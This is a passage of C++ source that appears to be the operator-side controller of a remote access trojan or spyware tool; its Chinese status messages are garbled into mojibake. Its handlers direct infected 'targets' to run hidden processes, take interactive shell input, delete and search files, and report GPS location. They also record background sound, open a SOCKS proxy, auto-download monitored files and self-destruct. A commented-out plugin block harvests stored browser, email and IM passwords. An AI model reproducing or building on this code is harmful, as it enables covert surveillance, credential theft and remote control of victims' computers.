    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if ("DATA" == args[3])
    {
        CopyMemory(&tarBlock->logicDriverSet , data.c_str(), dataLen);

        // �洢�����ݿ���
        //
        DM->AddTargetLogicDriver(tarBlock->dwTargetID, tarBlock->logicDriverSet);

        // ���½���
        //
        if (tarBlock->frmTarControl)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPDATE_LIRINFO, NULL, NULL);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_DIR(ULONG targetId, const char  *base64Path)
{
    // TID PID DIR Path
    //  0   1   2   3
    //

    xASSERT((base64Path));
    
    std::ostringstream buf;
    buf << targetId << " 0 DIR " << base64Path << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_DIR(std::vector<std::string> & args)
{
	// TID PID DIR PATH DATA DATALEN\r\nDIRINFORMATION
	//  0   1   2    3   4      5            6
	//

	// TID PID DIR PATH OK   0(1)    0 -- begin, 1 -- end
	//  0   1   2    3   4    5
	//

	// TID PID DIR PATH ERR ErrorCode
	//  0   1   2    3   4      5
	//

    xASSERT((args.size() == 6));

    std::string data;                                 
	int			dataLen = 0;

	if ("DATA" == args[4])
	{
		dataLen = atoi(args[5].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
		data = GetData(dataLen);
	}

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    // Here args[3] is base64 path
    //

    string pathBase64 = args[3];

    if ("DATA" == args[4])
    {
        // gather and store DATA
        //
        std::string dirInfo = tarBlock->dirInfoMap[pathBase64];
        dirInfo += data;
        tarBlock->dirInfoMap[pathBase64] = dirInfo;
    }
    else
    {
        std::wstring widPath = GetWideFromBase64(pathBase64.c_str());
        int nErrCode = 0;
        
        if ("OK" == args[4])
        {
            if ("0" == args[5])
            {
                tarBlock->dirInfoMap[pathBase64] = "";
                return 0;
            }
            else     // "1"
            {
                time_t curtime;
                time(&curtime);
                std::string timStr = GetTimeString(curtime);
            
                DM->AddOfflineDirInfo(tarBlock,
                                      timStr,
                                      pathBase64.c_str(),
                                      tarBlock->dirInfoMap[pathBase64].c_str());

                SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] Զ�̻�ȡ\"%s\"�ļ��б�ɹ�",
                                                tarBlock->widTargetName.c_str(),
                                                tarBlock->dwTargetID,
                                                widPath.c_str());
            }
        }
        else      // ERR
        {
            nErrCode = strtoul(args[5].c_str(), NULL, 10);

            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] Զ�̻�ȡ\"%s\"�ļ��б�ʧ��: %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    widPath.c_str(),
                                                    ConvertErrorIdToStrW(nErrCode).c_str());
        }

        if (tarBlock->frmTarControl)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPDATE_DIRINFO, (LONG)widPath.c_str(), (long)nErrCode);
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_FDL(ULONG targetId, const char *base64Path)
{
    // TID PID FDL FILEPATH
    //  0   1   2     3
    //
    std::ostringstream buf;
    buf << targetId << " 0 FDL " << base64Path << "\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------

int   ControlConnection::Handle_FDL(std::vector<std::string> & args)
{
    // TID PID FDL FILEPATH OK(ERR) [ErrId]
    //  0   1   2     3       4       5
    //

    if (args.size() != 5 && args.size() != 6)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    std::wstring fdlPathw = GetWideFromBase64(args[3].c_str());

    if ("OK" == args[4])
    {
		if ( tarBlock->widTargetName != PhoneRecordFile )
			SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] Զ��ɾ���ļ�\"%s\" �ɹ�",
										  tarBlock->widTargetName.c_str(),
										  tarBlock->dwTargetID,
										  fdlPathw.c_str());
    }
    else
    {
        ULONG lastErrCode = strtoul(args[5].c_str(),NULL,10);
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] Զ��ɾ���ļ�\"%s\" ʧ��: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        fdlPathw.c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());
    }

    return 0;
}

//---------------------------------------------------------------------------
void  ControlConnection::Send_OSC(ULONG          targetID,
                                            ULONG          osId,
                                            const char*          tarDirPathBase64,
                                            ULONG          level,
                                            PSearchFilter  lpSearchFilter)
{
	// TID PID OSC OSID TarDirPathBase64 LEVEL
    //  0   1   2    3		    4           5

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   6        7        8          9           10          11        12         13
    //
    xASSERT((lpSearchFilter));

    std::ostringstream buf;
    buf << targetID << " 0 OSC " << osId << " " << tarDirPathBase64 << " " << level 
        << " " << lpSearchFilter->dwMinSize << " " << lpSearchFilter->dwMaxSize
        << " " << lpSearchFilter->uliBegTime.LowPart << " " << lpSearchFilter->uliBegTime.HighPart
        << " " << lpSearchFilter->uliEndTime.LowPart << " " << lpSearchFilter->uliEndTime.HighPart
        << " " << GetBase64FromWide(lpSearchFilter->widName).c_str() << " " << GetBase64FromWide(lpSearchFilter->widType).c_str() << "\r\n";

    this->Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_OSC(std::vector<std::string> & args)
{
	// TID PID OSC OsId OK/ERR  ErrId
    //  0   1   2   3    4        5
    //
    
    if (args.size() != 5 && args.size() != 6)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    DWORD   dwOsId = strtoul(args[3].c_str(), NULL, 10);

    if (args[4] == "ERR")
    {
        int lastErrCode = strtoul(args[5].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[Ŀ��%s(ID:%d)] ������������ʧ��: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

		if ( tarBlock->frmTarControl )
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_ERRORED, lastErrCode, dwOsId);
		}
    }

	return 1;
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_OSI(std::vector<std::string> & args)
{
 	// TID PID OSI OsId PathBase64 NameBase64 FileSize FileAttributes LowLastWriteTime HighLastWriteTime\r\n
	//  0   1   2   3	    4			5		 6				7			 8					9

    if (args.size() != 10)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    ULONG   osId = strtoul(args[3].c_str(), NULL, 10);

    PFILE_BLOCK lpFileBlock = new FILE_BLOCK();

    lpFileBlock->widPath = GetWideFromBase64(args[4].c_str());
    lpFileBlock->widName = GetWideFromBase64(args[5].c_str());
    lpFileBlock->Size = strtoul(args[6].c_str(), NULL, 10);
    lpFileBlock->FileAttributes = strtoul(args[7].c_str(), NULL, 10);

    ULARGE_INTEGER ulLastWriteTime;
    ulLastWriteTime.LowPart = strtoul(args[8].c_str(), NULL, 10);
    ulLastWriteTime.HighPart = strtoul(args[9].c_str(), NULL, 10);
    lpFileBlock->LastWriteTime = ulLastWriteTime.QuadPart;
    
    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_FOUND_BLOCK, osId, (long)lpFileBlock);
    }

	return 1;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_OSF(ULONG     targetID,
                                            ULONG     osId)
{
	// TID PID OSF OsId
	//  0   1   2    3

    std::ostringstream buf;
    buf << targetID << " 0 OSF " << osId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_OSF(std::vector<std::string> & args)
{
	// TID PID OSF OsId  Flag (1 - finished, 0 - canceled)
	//  0   1   2    3     4

    if (args.size() != 5)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    DWORD osId = strtoul(args[3].c_str(), NULL, 10);
    DWORD flag = strtoul(args[4].c_str(), NULL, 10);
    
    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_ONLINESEARCH_FINISHED, osId, flag);
    }

	return 1;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_PNG()
{
    // TID PID PNG
    //  0   1   2
    //
    std::ostringstream buf;
    buf << "0 0 PNG\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_QNG(std::vector<std::string> & args)
{
    // Do Nothing
    //
    return 0;
}

//---------------------------------------------------------------------------
void  ControlConnection::Send_PLG(ULONG   targetId,
                                             ULONG   pluginId,
                                             char    *plgType)
{
    // TID PID PLG PLGTYPE PID
    //  0   1   2      3    4
    //

    // @@NOTE:
    //    the first PID is PID of manager plugin
    //    the second PID is real PID

    std::ostringstream buf;
    buf << targetId << " 1 PLG "
        << plgType << " " << pluginId << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_PLG(std::vector<std::string> & args)
{ 
    // TID PID PLG PLGTYPE PID OK
    //  0   1   2     3     4   5
    //

    // TID PID PLG PLGTYPE PID ERR ErrorId
    //  0   1   2     3     4   5     6 
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }
        
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[4].c_str(),NULL,10);

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    UINT    msgId  = 0;
    UINT    lastErrCode = 0;

    if (args[3] == "STA")
    {
        if (args[5] == "OK")
        {
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�����%s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str());

//            msgId = WM_LOADPLUGIN_SUCCESS;
            
/* @@@           if (DPAPI_PLUGIN_ID == pluginId)
            {
                tarBlock->dpapiLoadFlag = TRUE;

                tarBlock->ieAutoString = "";
                tarBlock->iePassString = "";
                tarBlock->emailString  = "";
                tarBlock->imsString    = "";

                this->Send_DPA(targetId, "ATO");
                this->Send_DPA(targetId, "PAS");
                this->Send_DPA(targetId, "EMA");
                this->Send_DPA(targetId, "IMS");
            }*/            
        }
        else        // ERR
        {
            lastErrCode = strtoul(args[6].c_str(),NULL,10);
                    
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[Ŀ��%s(ID:%d)] ����%s ʧ��: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

//           msgId = WM_LOADPLUGIN_FAILURE;
        }
    }
    else if (args[3] == "STO")
    {
        if (args[5] == "OK")
        {
            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�ͣ�� %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str());
                                    
//           msgId = WM_UNLOADPLUGIN_SUCCESS;

/* @@@           if (DPAPI_PLUGIN_ID == pluginId)
            {
                tarBlock->dpapiLoadFlag = FALSE;
            }*/
        }
        else        //ERR
        {
            lastErrCode = strtoul(args[6].c_str(),NULL,10);

            SetTarStatusInfoExW(STATUS_NOTE, tarBlock, L"[Ŀ��%s(ID:%d)] ͣ��%sʧ��: %s",
                                        tarBlock->widTargetName.c_str(),
                                        tarBlock->dwTargetID,
                                        ConvertPluginIdToLangW(pluginId).c_str(),
                                        ConvertErrorIdToStrW(lastErrCode).c_str());

//            msgId = WM_UNLOADPLUGIN_FAILURE;
        }
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, msgId, pluginId, NULL);
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_RUN(DWORD dwTargetId, std::wstring procPath, BOOL bRedirectIO)
{
    // TID PID RUN SHOWTYPE IOTYPEProcPath
    //  0   1   2     3        4
    //
    std::string pathBase64 = GetBase64FromWide(procPath);
    std::ostringstream buf;
    
    if (bRedirectIO)
    {
        buf << dwTargetId << " 0 RUN HIDE IO " << pathBase64.c_str() << "\r\n";
    }
    else
    {
        buf << dwTargetId << " 0 RUN HIDE NO " << pathBase64.c_str() << "\r\n";
    }

    Write(buf);    
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_RUN(std::vector<std::string> & args)
{
    // TID PID RUN SHOWTYPE IOTYPE ProcPath OK[ERR] ErrID
    //  0   1   2     3       4       5         6    7
    //

    if (args.size() != 8 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
        
    std::wstring procPath = GetWideFromBase64(args[5].c_str());

    if (args[6] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] �ɹ���������:%s",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID,
                                                                procPath.c_str());    
        if (args[4] == "IO")
        {
            tarBlock->bRedirectIO = true;
            tarBlock->widRedirectProc = procPath;
            SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_REDIRECT, NULL, NULL);
        }
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] �������̳���:%s",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID,
                                                                procPath.c_str());
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_CITW(DWORD dwTargetID, std::wstring widInput)
{
    // TID PID CIT A/W INPUTBASE64
    //  0   1   2   3     4
    //

    std::string inputBase64 = GetBase64FromWide(widInput);

    std::ostringstream buf;
    buf << dwTargetID << " 0 CIT W " << inputBase64.c_str() << "\r\n";
    Write(buf); 
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_CITA(DWORD dwTargetID, std::string aniInput)
{
    // TID PID CIT A/W INPUTBASE64
    //  0   1   2   3     4
    //

    std::string inputBase64 = GetBase64FromAnsi(aniInput);

    std::ostringstream buf;
    buf << dwTargetID << " 0 CIT A " << inputBase64.c_str() << "\r\n";
    Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_CIT(std::vector<std::string> & args)
{
    // TID PID CIT OK/ERR [ERRID]
    //  0   1   2    3       4
    //
    if (args.size() != 4 && args.size() != 5 )
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    if (args[3] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] �ɹ����н���ʽ����",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] ����ʽ�������",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }

    return 0;

}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_COT(std::vector<std::string> & args)
{
    // TID PID COT DATA  A(W) LEN\r\nDATA
    //  0   1   2   3    4     5
    //

    if (args.size() != 6)
    {
        assert(false);
        return 0;
    }
        
    std::string data;
	int			dataLen = atoi(args[args.size() - 1].c_str());

    if (false == IsWholeDataAvailable(dataLen))
	{
		RecoverCommand();
    	return -1;
	}
	data = GetData(dataLen);

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if (args[4] == "W")
    {
		tarBlock->widRedirectOutput = AnsiToWide(data);
    }
    else
    {
        std::string aniOutput = data.c_str();
		tarBlock->widRedirectOutput = AnsiToWide(aniOutput);
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_OUTPUT, NULL, NULL);
    }

    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_CFI(DWORD dwTargetID)
{
	// TID PID CFI 
	//  0   1   2  
	//
    std::ostringstream buf;
    buf << dwTargetID << " 0 CFI\r\n";
    Write(buf);    
}

void ControlConnection::Send_GPRS(DWORD dwTargetId)
{
	// TID PID GPRS
	//  0   1   2
	//

	std::ostringstream buf;

	buf << dwTargetId << " 0 GPRS\r\n";

	this->Write(buf);
}

void ControlConnection::Send_AGT(ULONG targetID, TaskDirect taskDirect, const char* tarDirPathBase64, ULONG level, ULONG autoDown)
{
	// TID PID AGT TaskDirect TarDisPathBase64 LEVEL AutoDown
	//  0   1   2      3		   4		     5		6
	//

	std::ostringstream buf;
	buf << "0" << " 1 AGT DOW " << tarDirPathBase64 << " " << level << " " << autoDown << "\r\n";
	this->Write(buf);
}

void ControlConnection::Send_BACKSOUND(ULONG targetID, bool open, ULONG time)
{
	std::ostringstream buf;
	buf << targetID << " 0 BGS " << (open ? "1" : "0") << " " << time << "\r\n";
	this->Write(buf);
}

int ControlConnection::Handle_GPRS(std::vector<std::string> & args)
{
	// TID PID GPRS EastLongitude NorthLatitude remark
	//  0   1   2	   3		  4                5
	//

	//_ASSERT( 6 == args.size() );

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	std::wstring time = AnsiToWide(TGetCurrentTime());
	std::wstring x = AnsiToWide(args[3]);
	std::wstring y = AnsiToWide(args[4]);

	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( x == L"0.000000" && y == L"0.000000" )
	{
		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] Ŀ�����δ�� GPS ��λ����",
			tarBlock->widTargetName.c_str(),
			targetID);

		return 0;
	}


	std::wstring remark = GetWideFromBase64(args[5]);

	SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] Ŀ�굱ǰ����λ��Ϊ : %s",
		tarBlock->widTargetName.c_str(),
		targetID,
		remark.c_str());


	DM->InsertLocationInfo(targetID, time, x, y, remark);

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_NEW_LOCATION, NULL, NULL);
	}

	return 0;

}

//---------------------------------------------------------------------------
int  ControlConnection::Handle_CFI(std::vector<std::string> & args)
{
	// TID PID CFI 
	//  0   1   2  
	//
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    if (tarBlock->frmTarControl)
    {
        SendMessage(tarBlock->frmTarControl->Handle, WM_REMOTERUN_FINISHED, NULL, NULL);
    }

    return 0;    
}
//---------------------------------------------------------------------------
// ��������
void  ControlConnection::Send_CRP(Target *tarBlock, std::wstring procPath, BOOL bHideExec)
{
    // TID PID CRP HIDE ProcPath
    // TID PID CRP SHOW ProcPath
    //  0   1   2   3      4
    //
    std::string pathBase64 = GetBase64FromWide(procPath);
    std::ostringstream buf;
    
    if (bHideExec)
    {
        buf << tarBlock->dwTargetID << " 1 CRP HIDE " << pathBase64.c_str() << "\r\n";
    }
    else
    {
        buf << tarBlock->dwTargetID << " 1 CRP SHOW " << pathBase64.c_str() << "\r\n";
    }

    Write(buf);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_CRP(std::vector<std::string> & args)
{
	// TID PID CRP OK(ERR) [ErrorId]\r\n
	//  0   1   2   3          4
	//

    if (args.size() != 4 && args.size() != 5 )
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    if (args[3] == "OK")
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] �ɹ���������",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }
    else
    {
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] �������̳���",
                                                                tarBlock->widTargetName.c_str(),
                                                                targetID);
    }

    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_ERA(ULONG targetId)
{
    // TID PID ERA
    //
    std::ostringstream buf;
    buf << targetId << " 1 ERA\r\n";
    this->Write(buf);    
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_ERA(std::vector<std::string> & args)
{
    // TID PID ERA Ret
    //  0   1   2   3 
    //

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    ULONG ret      = strtoul(args[3].c_str(), NULL, 10);

    PostMessage(FrmMain->Handle, WM_ERASE_TARGET, targetId, ret); 

    return 0;
}

//---------------------------------------------------------------------------
int  ControlConnection::Handle_SIL(std::vector<std::string> & args)
{
    // TID PID SIL  OK 
    //  0   1   2   3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)]��Ĭָ��ɹ��´�!",
                                tarBlock->widTargetName.c_str(), targetID );
    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_SIL(ULONG targetId, FILETIME &ftBeg, FILETIME &ftEnd)
{
    // TID PID SIL HighPartEnd LowPartEnd HighPartBeg LowPartBeg
	//  0   1   2       3          4            5          6
	//
    std::ostringstream buf;
    buf << targetId << " 0 SIL " << ftEnd.dwHighDateTime << " " << ftEnd.dwLowDateTime
        << " " << ftBeg.dwHighDateTime << " " << ftEnd.dwLowDateTime << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_SDS(ULONG targetId)
{
    // TID PID SDS LiveFlag
    //  0   1   2     3
    //
    std::ostringstream ss;
    ss << targetId << " 0 SDS 0\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
int   ControlConnection::Handle_SDS(std::vector<std::string> & args)
{
    // TID PID SDS OK 
    //  0   1   2   3
    //
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    SetStatusInfoExA(STATUS_INFO, "[Ŀ��%d(ID:%d)] �Ի�ָ��ɹ��´Ŀ�꽫��������֮���Ի�!", targetID);
    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_SSX(std::vector<std::string> & args)
{
    // TID PID SSX FLAG
    //  0   1   2    3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    ULONG flag = strtoul(args[3].c_str(), NULL, 10);

    if (flag == 1)
    {
        SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] SOCKS�������óɹ�",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    else
    {
        SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] SOCKS��������ʧ��",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    
    return 0;
}
//---------------------------------------------------------------------------
int  ControlConnection::Handle_ESX(std::vector<std::string> & args)
{
    // TID PID ESX FLAG
    //  0   1   2    3
    //
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target * tarBlock = GetTargetFromGlobalMap(targetID);
    if (tarBlock == NULL)
    {
        return 0;
    }

    ULONG flag = strtoul(args[3].c_str(), NULL, 10);

    if (flag == 1)
    {
        SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] SOCKS����ͣ�óɹ�!",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    else
    {
        SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%d)] SOCKS����ͣ��ʧ��!",
                                    tarBlock->widTargetName.c_str(), targetID );
    }
    
    return 0;
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_SSX(ULONG ulTargetID,  USHORT usPort)
{
    // TID PID PXY AUTH PORT
    //  0   1   2   3     4
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 SSX 0 " << usPort << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_SSX(ULONG ulTargetID,  USHORT usPort, PCHAR lpszUser, PCHAR lpszPass)
{
    // TID PID PXY AUTH PORT USER PASS
    //  0   1   2   3     4    5    6
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 SSX 1 " << usPort
       << " " << lpszUser << " " << lpszPass << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
void  ControlConnection::Send_ESX(ULONG ulTargetID)
{
    // TID PID PXY
    //  0   1   2
    //
    std::ostringstream ss;
    ss << ulTargetID << " 0 ESX\r\n";
    Write(ss);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public �ļ��������
//
void ControlConnection::Send_FMT(DWORD dwTargetId, std::wstring path, ULONG add, std::wstring ext)
{
	// ��ʼ�� 

	// TID PID MTN
	//  0   1   2 
	//

	// ���ָ���ļ����ļ���

	// TID PID FMT ADD PathBase64 ExtBase64
	//  0   1   2   3      4          5
	//

	std::ostringstream buf;

	if ( L"" == path )
	{
		buf << dwTargetId << " 0 MTN\r\n";
	}
	else
	{
		buf << dwTargetId << " 0 FMT " << add << " " << GetBase64FromWide(path).c_str() << " " 
			<< GetBase64FromWide(ext).c_str() << "\r\n";
	}

	this->Write(buf);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private �ļ����
//
int ControlConnection::Handle_FMT(std::vector<std::string> &args)
{
	// TID PID FMT ADD DIRPATHBASE64 OK
	//  0   1   2   3         4       5
	//

	// TID PID FMT     ADD DIRPATHBASE64 ERR ERRCODE
	//  0   1   2       3         4       5     6
	//

	// TID PID FMT WHERE  CHG   TIME    SIZE   PATHBASE64 
	// 0   1    2   3      4      5        6      7

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( NULL == tarBlock )
		return 0;

	std::string path;

	// 
	// �ļ��仯
	//
	if ( "CHG" == args[4] )
	{
		ULONG dwWhere = strtoul(args[3].c_str(),NULL,10);
		LONGLONG dwTime = _atoi64(args[5].c_str());

		path = args[7];
		// ȥ����ĩ�ķֺ�
		path = path.substr(0, path.length()-1);
		int pos = path.rfind(';');
		std::string newFileName = path.substr(pos+1, path.length()-pos);
		path = path.substr(0, pos);
		
		LONGLONG size = _atoi64(args[6].c_str());
		
		WCHAR wzCount[MAX_PATH] = {0};
		std::wstring remark = ConvertFileChangeStatusToStr(dwWhere);

		if ( dwWhere == FILE_ACTION_RENAMED_OLD_NAME
			|| dwWhere == FILE_ACTION_RENAMED_NEW_NAME )
		{
			std::wstring newStr = GetWideFromBase64(newFileName);
			remark += L" : ";
			remark += newStr;
		}

		std::wstring realPath = GetWideFromBase64(path);

		DM->InsertFileMonitorRecord(targetID, remark, realPath, GetTimeFromLongLong(dwTime));

		SetStatusInfoExW(STATUS_INFO, L"[Ŀ��%s(ID:%u)] ���ӵ��ļ�״̬�ı� \"%s\" ",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			realPath.c_str());

		SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] ���ӵ��ļ�״̬�ı� \"%s\" ",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			realPath.c_str());

		CHG_INFO changeInfo;
		changeInfo.remark = remark;
		changeInfo.dwTime = dwTime;

		if (tarBlock->frmTarControl)
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_FILEMONITOR_CHANGED, (LONG)realPath.c_str(), (LONG)&changeInfo);
		}

		std::wstring ctrPathW = L"..";

		if ( tarBlock->bTarConnOnline
			&& 
			( dwWhere == FILE_ACTION_MODIFIED || dwWhere == FILE_ACTION_ADDED ))
		{
			// �����ļ�
			std::wstring setting = GetExePath() + L"\\setting.ini";
			int download = ReadValueFromLocal(L"Control", L"AdvanceMonitorPolicy", setting.c_str());

			// 0 - Auto download
			// 1 - Ask before download
			// 2 - Disable download

			if ( 2 == download )
				return 0 ;

			if ( 1 == download )
			{
				WCHAR msg[1024] = {0};
				wsprintfW(msg, L"��ص��ļ� %s �����仯\r\n�Ƿ�����?", realPath.c_str());

